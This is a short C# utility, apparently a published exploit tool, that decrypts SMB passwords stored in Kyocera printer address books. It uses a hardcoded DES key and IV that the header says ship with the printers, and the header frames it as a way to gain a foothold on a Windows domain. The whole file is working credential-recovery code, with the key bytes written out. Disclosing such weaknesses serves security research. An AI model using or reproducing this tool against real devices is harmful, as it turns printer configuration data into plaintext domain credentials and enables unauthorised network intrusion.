/*
Exploiting printers to gain foothold on a domain.
Kyocera Comes with a pre-bundled Key and IV
This utility seeks to create a threat model around the weak encryption and misconfiguration of features for abuse 
Tested via: 
- Kyocera ECOSYS M2640idw
- Kyocera 4550i
It obeys : RFC2898
Author: Alien-within
*/
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Linq;
​
public class Alienwithin
{
    public static void Main(string[] args)
    {
        System.Console.WriteLine("#################################################");
        System.Console.WriteLine("      Kyocera AddressBook SMB Password Decryptor ");
        System.Console.WriteLine("                   By Alien-Within               ");
        System.Console.WriteLine("#################################################");
        Console.WriteLine("Enter the value of SmbLoginPasswd field : ");
        string KyoceraSMBPass = Console.ReadLine();
        try
        {
            DESCryptoServiceProvider AlienwithinDESProvider = new DESCryptoServiceProvider();
            AlienwithinDESProvider.Mode = CipherMode.CBC;
            AlienwithinDESProvider.Padding = PaddingMode.None;
            var key = new byte[] { 0x41, 0xF4, 0xA3, 0x05, 0xF3, 0x8B, 0x46, 0x8F };
            var iv  = new byte[] { 0x01, 0x82, 0x0D, 0x0B, 0x38, 0x3E, 0xCB, 0x7C };
            var data  = StringToByteArray(KyoceraSMBPass.Trim());
            
            MemoryStream AlienwithinMemoryStream = new MemoryStream();
            
            CryptoStream CStream = new CryptoStream(AlienwithinMemoryStream, AlienwithinDESProvider.CreateDecryptor(key, iv), CryptoStreamMode.Write);
            CStream.Write(data, 0, data.Length);
            CStream.FlushFinalBlock();
            Console.WriteLine(Encoding.Default.GetString(AlienwithinMemoryStream.ToArray()));
            
         }
        catch (Exception ex)
        {
            Console.WriteLine(ex.ToString());
        }
    }
    public static byte[] StringToByteArray(string hex) {
    return Enumerable.Range(0, hex.Length)
                     .Where(x => x % 2 == 0)
                     .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                     .ToArray();
    }
}
